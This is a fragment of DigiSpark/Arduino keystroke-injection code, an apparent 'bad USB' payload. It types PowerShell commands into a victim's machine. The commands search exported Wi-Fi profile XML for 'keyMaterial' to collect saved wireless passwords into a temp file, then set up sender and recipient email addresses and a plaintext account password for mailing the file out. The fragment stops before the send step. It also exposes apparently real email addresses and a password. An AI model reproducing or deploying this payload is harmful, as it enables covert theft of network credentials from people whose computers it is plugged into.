...
void loop() {
  ...
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Select-String -Path Wi*.xml -Pattern 'keyMaterial' > temp.csv");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  //from email address:
  DigiKeyboard.print(F("$email = \"genilsomsoares7200@gmail.com\";"));
  //to email address
  DigiKeyboard.print(F("$addressee = \"isaac.floriano@hotmail.com\";"));
  // o lugar onde vai salvar as senhas
  DigiKeyboard.print(F("$tempcsv = \"$env:temp\\temp.csv\";"));
  // senha da sua conta
  DigiKeyboard.print(F("$pass = \"is180320M26\";"));
